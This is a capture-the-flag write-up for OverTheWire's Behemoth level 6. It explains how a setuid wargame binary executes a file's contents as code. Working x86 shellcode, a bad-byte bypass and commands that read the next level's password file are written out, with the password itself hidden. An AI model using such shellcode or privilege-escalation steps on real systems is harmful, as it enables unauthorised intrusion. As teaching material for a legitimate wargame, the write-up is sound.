# OverTheWire — Behemoth Level 6 → 7

> Goal: Get behemoth7 password from `behemoth6`. Result: **`**********`** (hidden)
> Technique: `behemoth6_reader` mmaps `shellcode.txt` from cwd as **RWX and executes it**;
> output is compared with "HelloKitty" via `strcmp` → behemoth6 opens a shell.

---

## 1. Connection
```bash
ssh behemoth6@behemoth.labs.overthewire.org -p 2221
```

## 2. Two binaries
```c
// behemoth6:
fp = popen("/behemoth/behemoth6_reader", "r");
fread(buf, 10, 1, fp);                       // 10 bytes of reader output
if (strcmp(buf, "HelloKitty") == 0) {        // rodata @0x804a03c = "HelloKitty"
    puts("Correct.");
    setreuid(geteuid(), geteuid());          // euid = behemoth7
    execl("/bin/sh", "sh", NULL);            // SHELL as behemoth7
} else puts("Incorrect output.");

// behemoth6_reader:
fd = open("shellcode.txt", O_RDONLY);
mem = mmap(0, 0x1000, PROT_READ|WRITE|EXEC, MAP_PRIVATE, fd, 0);   // mmap FILE as RWX
for (i=0; i<0x1000; i++) if (mem[i] == 0x0b) { puts("..."); exit; }   // 0x0b FORBIDDEN!
((void(*)())mem)();                          // EXECUTE shellcode.txt
```

## 3. Two critical points
1. **reader runs as behemoth6** (popen's `sh` drops effective uid) → shellcode can't escalate
   to behemoth7. Instead, the reader's **output** must be "HelloKitty" → `strcmp` hits →
   **behemoth6** (euid=behemoth7) calls `execl` for the shell.
2. **Byte 0x0b is forbidden:** reader scans shellcode for `0x0b` (= execve syscall number
   `mov al,0x0b`) and exits if found. → If execve is needed, use `mov al,0x0a; inc eax`
   (`b0 0a 40`) to set the syscall number without the 0x0b byte.

## 4. Exploit — shellcode.txt: write "HelloKitty" to stdout
```python
sc = bytes([
 0x68,0x74,0x79,0x00,0x00, 0x68,0x6f,0x4b,0x69,0x74, 0x68,0x48,0x65,0x6c,0x6c, 0x89,0xe1,  # push "HelloKitty"; ecx=str
 0x31,0xc0,0x31,0xdb,0xb3,0x01,0xb0,0x04,0x31,0xd2,0xb2,0x0a,0xcd,0x80,   # write(1, str, 10)
 0x31,0xc0,0x31,0xdb,0xb0,0x01,0xcd,0x80])                                # exit(0)
assert 0x0b not in sc
# -> write to shellcode.txt; run behemoth6 from that cwd; timed command to spawned shell
```
```bash
W=$(mktemp -d); cd "$W"; python3 -c '...' > shellcode.txt
python3 -c 'timed: "id; cat /etc/behemoth_pass/behemoth7"' | /behemoth/behemoth6
```
Output: `Correct.` → `uid=13007(behemoth7)` → password.


## Lessons
| Topic | Note |
|-------|------|
| File-to-shellcode exec | `mmap RWX(fd)` + `call mem` → file contents become executable code |
| Privilege drop (popen) | `popen`'s `sh` may drop euid; the parent suid process (behemoth6) must open the shell |
| Badchar filter | 0x0b is scanned → use `mov al,0x0a; inc eax` to set syscall number indirectly |
| strcmp gate | Reader output = expected string → parent program gives the reward |
